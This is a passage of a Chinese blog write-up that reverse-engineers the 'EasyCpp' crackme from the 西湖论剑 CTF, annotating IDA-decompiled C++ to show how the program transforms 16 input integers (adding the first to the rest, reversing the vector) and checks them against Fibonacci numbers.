<h1 id="西湖论剑之EasyCpp"><a href="#西湖论剑之EasyCpp" class="headerlink" title="西湖论剑之EasyCpp"></a>西湖论剑之EasyCpp</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// r15</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v7; <span class="comment">// rdx</span></span><br><span class="line">  __int64 r12_7; <span class="comment">// r12</span></span><br><span class="line">  __int64 v8; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v9; <span class="comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v12; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v13; <span class="comment">// rax</span></span><br><span class="line">  __int64 v14; <span class="comment">// r8</span></span><br><span class="line">  __int64 v15; <span class="comment">// r9</span></span><br><span class="line">  __int64 v16; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> *v18; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> **v20; <span class="comment">// [rsp+0h] [rbp-190h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-174h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+20h] [rbp-170h]</span></span><br><span class="line">  <span class="keyword">char</span> v23; <span class="comment">// [rsp+30h] [rbp-160h]</span></span><br><span class="line">  <span class="keyword">char</span> v24; <span class="comment">// [rsp+50h] [rbp-140h]</span></span><br><span class="line">  <span class="keyword">char</span> v25; <span class="comment">// [rsp+70h] [rbp-120h]</span></span><br><span class="line">  <span class="keyword">char</span> v26; <span class="comment">// [rsp+90h] [rbp-100h]</span></span><br><span class="line">  <span class="keyword">char</span> v27; <span class="comment">// [rsp+B0h] [rbp-E0h]</span></span><br><span class="line">  __int64 v28; <span class="comment">// [rsp+D0h] [rbp-C0h]</span></span><br><span class="line">  __int64 v29; <span class="comment">// [rsp+F0h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">int</span> v30[<span class="number">18</span>]; <span class="comment">// [rsp+110h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v31; <span class="comment">// [rsp+158h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  v20 = argv;</span><br><span class="line">  v31 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v23, argv, envp);<span class="comment">// #定义五个容器，相当于vector&lt;int&gt; v23,v24,v25,v26,v27</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v24, argv, v4);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v25, argv, v5);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v26, argv, v6);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v27, argv, v7);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v30[i], v20);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::push_back(&amp;v24, &amp;v30[i]);<span class="comment">// 相当于v24.push_back(v30[i]);</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">15</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v29) = fib(j);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::push_back(&amp;v23, &amp;v29);<span class="comment">// 相当于v23.push_back(fib(j)) ;   j从0-15</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::push_back(&amp;v25, v30);<span class="comment">// 相当于v25.push_back(v30[0]);  </span></span><br><span class="line"></span><br><span class="line">  r12_7 = <span class="built_in">std</span>::back_inserter&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;(&amp;v25);<span class="comment">// back_inserter创建一个容器指针，指向v25</span></span><br><span class="line"></span><br><span class="line">  v8 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end(&amp;v24);<span class="comment">// v8 = v24.end()</span></span><br><span class="line">  v29 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v24);<span class="comment">// v29 = v24.begin();</span></span><br><span class="line"></span><br><span class="line">  v9 = __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>+(&amp;v29, <span class="number">1L</span>L);<span class="comment">// 传v29的地址，在里面在用指针，相当于传了v24.begin(),这个操作过后就是相当于v9 = v24.begin() + 4;这里我所说的这种说法有语法错误，因为v24.begin()是迭代器，不能这么加，我说的是地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  Add(</span><br><span class="line">    v9,                                         <span class="comment">// v24.begin()+4 相当于数组第二个数</span></span><br><span class="line">    v8,                                         <span class="comment">// v24.end() 相当于数组最后一个数</span></span><br><span class="line">    r12_7,                                      <span class="comment">// 只有输入的第一个元素的容器</span></span><br><span class="line">    v30);                                       <span class="comment">// 输入的第一个元素的元素的值</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v28, v8, v11);<span class="comment">// 创建一个新容器 vector&lt;int&gt; v28</span></span><br><span class="line"></span><br><span class="line">  v12 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end(&amp;v25);<span class="comment">// v12 = v25.end();</span></span><br><span class="line">  v13 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v25);<span class="comment">// v13 = v25.begin();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::accumulate&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;,main::&#123;lambda(<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;,<span class="keyword">int</span>)#<span class="number">2</span>&#125;&gt;(</span><br><span class="line">    &amp;v29,</span><br><span class="line">    v13,</span><br><span class="line">    v12,</span><br><span class="line">    &amp;v28,</span><br><span class="line">    v14,</span><br><span class="line">    v15,</span><br><span class="line">    v3);                                        <span class="comment">// //倒置函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="keyword">operator</span>=(&amp;v26, &amp;v29);<span class="comment">//将容器v29赋值给v26</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v29);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v28);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">std</span>::<span class="keyword">operator</span>!=&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;(&amp;v26, &amp;v23) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You failed!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::back_inserter&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;(&amp;v27);</span><br><span class="line">  v16 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end(&amp;v24);</span><br><span class="line">  v17 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v24);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::copy_if&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,<span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,main::&#123;lambda(<span class="keyword">int</span>)#<span class="number">3</span>&#125;&gt;(v17);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You win!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your flag is:flag&#123;"</span>, v16, v20);</span><br><span class="line">  v28 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v27);</span><br><span class="line">  v29 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end(&amp;v27);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( __gnu_cxx::<span class="keyword">operator</span>!=&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;(&amp;v28, &amp;v29) )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>*(&amp;v28);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, *v18);</span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>++(&amp;v28);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">125</span>);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v27);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v26);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v25);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v24);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v23);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我的注释部分只写到了获得正确flag的过程部分，也就是前半部分，后面部分其实也不难，你们可以作为练习分析下，<br>下面根据这里面的难点和重点进行具体分析，整个过程最难的部分就是Add和accumulate,这两部分是重点，如果不理解这两部分是无法得到正确的flag的</p>
<p>我先对Add附近的进行分析</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v9 = __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>+(&amp;v29, <span class="number">1L</span>L);<span class="comment">// 传v29的地址，在里面在用指针，相当于传了v24.begin(),这个操作过后就是相当于v9 = v24.begin() + 1;</span></span><br></pre></td></tr></table></figure>
<p>这句我原来以为是将v29+1，后面才发觉这是取容器v29的第一个元素，如果这里看不懂的话，可以跟进去看看，双击这行</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>+(_QWORD *v24, __int64 num)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="number">4</span> * num + *v24;</span><br><span class="line">  __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::__normal_iterator(&amp;v4, &amp;v3);<span class="comment">// 相当于v4 = v3</span></span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>进行的是这个，他传入的是num,作为偏移，他取出来的是容器的第1个元素，我以下标为0为第一个元素，以后不在赘述</p>
</li>
<li><p>4*num + *24 这种写法很常见，在ida6.8尤其显著</p>
</li>
<li><p>他将int数组识别为char数组，取值的时候通常也是这样取，假设有个int数组 int num[5] = {1,2,3,4,5}; 在ida6.8里他识别为char num[20]; 取值的时候就num[4*i]，i是循环里的循环变量</p>
</li>
</ul>
<h3 id="接下来是Add部分"><a href="#接下来是Add部分" class="headerlink" title="接下来是Add部分"></a>接下来是Add部分</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">Add</span><span class="params">(__int64 &amp;num[<span class="number">1</span>], __int64 &amp;num[n], __int64 p, __int64 &amp;num[<span class="number">0</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = &amp;num[<span class="number">1</span>];                                <span class="comment">// 这里说明下，都是地址</span></span><br><span class="line">  v9 = &amp;num[n];</span><br><span class="line">  v8 = p;</span><br><span class="line">  v7 = &amp;num[<span class="number">0</span>];</span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( __gnu_cxx::<span class="keyword">operator</span>!=&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;(&amp;v10, &amp;v9) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>*(&amp;v10);<span class="comment">// v4 = v10</span></span><br><span class="line">    v11 = main::&#123;lambda(<span class="keyword">int</span>)#<span class="number">1</span>&#125;::<span class="keyword">operator</span>() <span class="keyword">const</span>(&amp;v7, *v4);<span class="comment">// 点进去后发现就是num[0] + *v10</span></span><br><span class="line">    v5 = <span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>*(&amp;v8);<span class="comment">// v5 = &amp;v8</span></span><br><span class="line">    <span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>=(v5, &amp;v11);<span class="comment">// 将结果存到v5里去，v5指向result容器</span></span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>++(&amp;v10);<span class="comment">// 指针自加，相当于数组下标+1</span></span><br><span class="line">    <span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>++(&amp;v8);<span class="comment">// 指针++</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>具体注释我也写好了，匿名函数你在外部看不出什么，然后你双击进去后就能看出他是干什么了，这里就相当于</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt; num.Length; i++)</span><br><span class="line">    num[i] = num[<span class="number">0</span>] + num[i];</span><br></pre></td></tr></table></figure>
<h3 id="accumulate"><a href="#accumulate" class="headerlink" title="accumulate"></a>accumulate</h3><p>这部分对我来说可能最难理解的吧，他有好多层，我一层层进去后，最后才理解他是如何将容器进行倒置的</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="built_in">std</span>::accumulate&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;,main::&#123;lambda(<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;,<span class="keyword">int</span>)#<span class="number">2</span>&#125;&gt;(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, <span class="keyword">char</span> a7)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ebx</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+0h] [rbp-70h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+8h] [rbp-68h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+18h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [rsp+20h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [rsp+40h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v15; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v12 = a1;</span><br><span class="line">  v11 = a2;</span><br><span class="line">  v10 = a3;</span><br><span class="line">  v9 = a4;</span><br><span class="line">  v15 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( __gnu_cxx::<span class="keyword">operator</span>!=&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;(&amp;v11, &amp;v10) )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = *__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>*(&amp;v11);<span class="comment">//v11就是我们输入的元素，这里你可以对照我上面部分的注释，看传入的参数是什么</span></span><br><span class="line">    <span class="built_in">std</span>::<span 